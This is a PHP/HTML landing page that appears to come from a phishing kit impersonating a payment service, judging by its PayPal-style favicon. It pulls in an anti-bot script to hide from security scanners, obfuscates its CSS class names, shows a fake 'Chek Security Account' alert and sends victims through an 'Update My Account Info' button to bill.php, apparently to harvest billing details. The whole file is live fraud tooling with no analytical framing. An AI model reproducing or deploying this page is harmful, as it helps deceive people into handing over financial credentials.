<?php
if (!isset($_SESSION)) {
  session_start();
}

 
require_once 'encriptar.php'; 
include      "antibots.php";  
    





?>
<style>
@import "bootstrap-responsive.css";


nmsbnxbhek::-moz-focus-inner {
  padding: 0;
  margin: -1px;
}

html {
  overflow-y: scroll;

}
body {
  margin: 0;
  padding: 0;
  color: #292929;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 81.25%;

  -webkit-font-smoothing: antialiased;
  font-smoothing: antialiased;
}
body.loggedOut {
  min-width: 1038px;
}
.headline {
  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
}


#khsgvsakhsagvksah {
  margin: 0 auto;
}
#khsgvsakhsagvksah ul li {
  margin: 0;
  padding: 0;
  display: inline-block;
  margin-right: 20px;
}
#khsgvsakhsagvksah ul a {
  color: #666;

  line-height: 2.1818em;
}
#khsgvsakhsagvksah .sssdksdksd {
  oveflow: auto;
  margin: 0 auto;
  margin-bottom: 42px;
  width: auto;
  font-size: .846em;
}
@media (min-width: 990px) {
  #khsgvsakhsagvksah .sssdksdksd {
    width: 990px;
  }
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd {
  padding-top: 16px;
  margin: auto;
  padding-left: 10px;
  height: 50px;
  border-top: 1px solid rgba(0, 0, 0, 0.1);
}
@media screen and (min-width: 589px) and (max-width: 990px) {
  #khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd {
    width: 90%;
  }
}
@media screen and (max-width: 590px) {
  #khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd {
    width: auto;
  }
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .chnahowa  ? {
  float: left;
  clear: both;
  margin: 0 0 0 0;
  padding: 0 10px 0 0;

}
@media screen and (min-width: 763) and (max-width: 982px) {
  #khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .chnahowa  ? {
    margin: 0 0 20px 0;
  }
}
@media screen and (max-width: 762px) {
  #khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .chnahowa  ? {
    margin: 0 0 10px 0;
  }
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .7ooomos ul {
  float: left;
  margin: 0 0 0 0;
  padding: 0;
  width: auto;
  color: #565656;
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .7ooomos ul li {
  border-left: 1px solid #666;

  padding-left: 0px;
  margin: 0;
  line-hieght: 16px;
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .7ooomos ul li:first-child {
  border-left: 0;
  margin: 0;
  padding: 0;
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .7ooomos ul li:first-child a {
  margin: 0 5px 0 0;
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd .7ooomos ul li a {
  line-height: 1em;
  margin: 0 5px;
}
#khsgvsakhsagvksah .sssdksdksd .7ooomos {
  overflow: auto;
  margin-top: 6px;
}

a.nmsbnxbhek,
a.nmsbnxbhek:link,
a.nmsbnxbhek:visited,
.nmsbnxbhek,
nmsbnxbhek {
  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
  color: #fff;
  font-weight: bold;
  text-align: center;
  background-color: #009cde;
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border: none;
  border-radius: 5px;
  padding: 7px 15px 8px;
  width: 320px;
  height: 44px;
  cursor: pointer;
}
@media screen and (max-width: 580px) {
  a.nmsbnxbhek,
  a.nmsbnxbhek:link,
  a.nmsbnxbhek:visited,
  .nmsbnxbhek,
  nmsbnxbhek {
    width: 100%;
    max-width: 220px;
  }
}
.nmsbnxbhek:hover,
nmsbnxbhek:hover,
nmsbnxbhek:focus,
.nmsbnxbhek:focus,
.nmsbnxbhek:active,
nmsbnxbhek:active {
  background-color: #0a8cc4;
}

.nmsbnxbhek.disabled,
.nmsbnxbhek.disabled:hover,
.nmsbnxbhek.disabled:active {
  background-color: #b2d9ea;
  cursor: auto;
}

a.nmsbnxbhek {
  display: inline-block;
  padding-left: 18px;

  padding-right: 18px;
  text-decoration: none;
}


form .sssdksdksd {
  background-color: #f0f0f0;
  color: #666;
  padding: 15px 44px;
  margin: 60px -60px -60px -60px;
}
@media screen and (max-width: 440px) {
  form .sssdksdksd {
    border-top: 0;
    box-shadow: none;
    background-color: transparent;
    color: #666;
    margin: 20px -44px -10px -44px;
  }
}
.hdkvbkbsaka {
  margin: 0;
  padding: 0;
  margin-left: -20px;
}
@media screen and (max-width: 580px) {
  .hdkvbkbsaka {
    margin-left: 0px;
  }
  .hdkvbkbsaka nmsbnxbhek {
    font-size: 8px;
  }
  .hdkvbkbsaka table th,
  .hdkvbkbsaka td {
    width: 50%;
  }
}
.hdkvbkbsaka table {
  border-collapse: separate;
  border-spacing: 0;
  color: #565656;
}
.hdkvbkbsaka table tr th,
.hdkvbkbsaka table tr td {
  border-right: 1px solid #ccc;
  border-bottom: 1px solid #ccc;
  padding: 15px;
}
.hdkvbkbsaka table tr th:first-child,
.hdkvbkbsaka table tr td:first-child {
  border-left: 1px solid #ccc;
}
.hdkvbkbsaka table tr th {
  background: #eee;
  border-top: 1px solid #ccc;
  text-align: left;
}
.hdkvbkbsaka table tr:first-child th:first-child {
  border-top-left-radius: 5px;
}
.hdkvbkbsaka table tr:first-child th:last-child {
  border-top-right-radius: 5px;
}
.hdkvbkbsaka table tr:last-child td:first-child {
  border-bottom-left-radius: 5px;
}
.hdkvbkbsaka table tr:last-child td:last-child {
  border-bottom-right-radius: 5px;
}

.qyiqwgtiwqugbiusdk {
  text-align: center;
}


.qtryuionbsmd {
  height: 72px;
  background-color: #f5f5f5;
  -moz-box-shadow: 0 -5px 5px #5a595d;
  -webkit-box-shadow: 0 -5px 5px #5a595d;
  box-shadow: 0 -5px 5px #5a595d;
}
.qtryuionbsmd .hdskhsdhsdksdhkq {
  overflow: visible;
  margin: 0 auto;
  width: 988px;
}
@media only screen and (min-width: 988px) {
  .qtryuionbsmd .hdskhsdhsdksdhkq {
    width: 988px;
  }
}
@media (max-width: 987px) {
  .qtryuionbsmd .hdskhsdhsdksdhkq {
    width: 100%;
  }
}
#aaaannnnnnoooonnniiismaaa {
  margin: 12px 10px;
}
.logo img {
  display: block;
  margin: 13px 0 0;
}
.loasjsdlkdwqww .logo {
  float: left;
  padding: 10px 20px;
}
/** mgharbaaaaaaaaaaa **/
.skbsakhsabkasbkash {
  padding: 40px 0 40px 0;
}
p,
ul {
  color: #565656;
  line-height: 1.4615em;
}
@media only screen and (min-width: 988px) {
  .loasjsdlkdwqww,
  .khsgvsakhsagvksah,
  #mgharbaaaaaaaaaaa {
    min-width: 988px;
  }
}
@media (max-width: 987px) {
  .loasjsdlkdwqww,
  .khsgvsakhsagvksah,
  #mgharbaaaaaaaaaaa {
    width: 100%;
  }
}


#mgharbaaaaaaaaaaa .jlsjlsabsajklabslaklj {
  margin-bottom: 16px;
  width: 570px;
  margin: 0 auto 20px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  -ms-box-sizing: border-box;
  box-sizing: border-box;
}
@media (max-width: 590px) {
  #mgharbaaaaaaaaaaa .jlsjlsabsajklabslaklj {
    width: 100%;
  }
}
#mgharbaaaaaaaaaaa .hskvbgskhasvbkshakh {
  background-color: #fff;
  border: 1px solid;
  border-color: #c5c5c5;
  position: relative;
  padding: 44px;
  border-radius: 8px;
  text-decoration: none;
  width: auto;
}
#mgharbaaaaaaaaaaa h1,
#mgharbaaaaaaaaaaa h2,
#mgharbaaaaaaaaaaa h3 {
  font-family: "HelveticaNeue-Light", "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, sans-serif;
  font-weight: 300;
  margin: 0;
  color: #2c2e2f;
}
#mgharbaaaaaaaaaaa h1 {
  word-wrap: break-word;
  font-size: 22px;
  margin-bottom: 10px;
}
#mgharbaaaaaaaaaaa h2,
#mgharbaaaaaaaaaaa h3 {
  padding-top: 20px;
  line-height: 1.4em;
  font-size: 15px;
}
#mgharbaaaaaaaaaaa h2subheaderText,
#mgharbaaaaaaaaaaa h3subheaderText {
  font-size: 18px;
}

#mgharbaaaaaaaaaaa form #personalInfoContinue {
  clear: both;
  float: left;
}

a {
  color: #0079C1;
  text-decoration: none;
  cursor: pointer;
}
nmsbnxbhek {
  margin-top: 6px;
  margin-bottom: 20px;
  font-size: 15px;
}


html {
  background: none;
}
#page {
  background: #fff;
}
.qtryuionbsmd {
  background-color: #fff;
  border-bottom: none;
  box-shadow: none;
}
#mgharbaaaaaaaaaaa {
  border-top: none;
}
#main.ljsbkdjzsbdskj {
  background: none #f4f4f4;
}
#khsgvsakhsagvksah .sssdksdksd .mhsdvbsdakhsd {
  height: 40px;
  border-top: none;
}
hr {
  border: 0;
  border-top: 1px solid #E7E7E8;
  margin: 27px 0 13px;
}

<style/>





<!DOCTYPE html>
<html class=" ES js " lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Chek Security Account</title>
   
	  <link rel="shortcut icon" link rel="logo-icon" href="pp_favicon_x.ico">
      <style type="text/css"></style>
   </head>
   <body class="hkmsvsvsahj-jgdsvcashsagh" >
      <div id="page" class="hksabsab-qyetqi">
         <header class="loasjsdlkdwqww">
            <div class="qtryuionbsmd">
               <div class="hdskhsdhsdksdhkq">
                  </br>    <img src="files/hlogo.png" >
               </div>
            </div>
         </header>
         <div id="mgharbaaaaaaaaaaa">
            <div id="main" class="ljsbkdjzsbdskj">
               <div class="hsvsahj-hjsavghjsa-hjsvsajh">
                  <div class="skbsakhsabkasbkash">
                     <div class="jlsjlsabsajklabslaklj swwiwa waaaaaaaaaalo">
                        <div class="hskvbgskhasvbkshakh swwiwa" >
                           <section  class="page" >
                              <header>
                                 <h1 class="hdkvbkbsak">
                                 </h1>
                              </header>
                              <div class="hdkvbkbsaka">
                                 <table>
                                    <thead>
                                       <tr>
                                          <th><IMG SRC="files/er.png"></th>
                                       </tr>
                                    </thead>
                                    <tbody>
                                       <tr>
                                          <td colspan="2" class="qyiqwgtiwqugbiusdk"><IMG SRC="files/sc.jpg"></td>
                                       </tr>
                                       <tr>
                                       <tr>
                                          <td colspan="2" class="qyiqwgtiwqugbiusdk"><a href="bill.php" ><button  class="nmsbnxbhek" type="submit" ><b>      Update My Account 		Info         </b></button></a></td>
                                       </tr>
                                       </tr>
                                    </tbody>
                                 </table>
                              </div>
                           </section>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <footer id="khsgvsakhsagvksah" >
            <div class="sssdksdksd">
               <div class="mhsdvbsdakhsd">
                  <div>
                   <center>  <IMG SRC="files/fooot.png"> <center/>
                  </div>
               </div>
            </div>
         </footer>
      </div>
</html>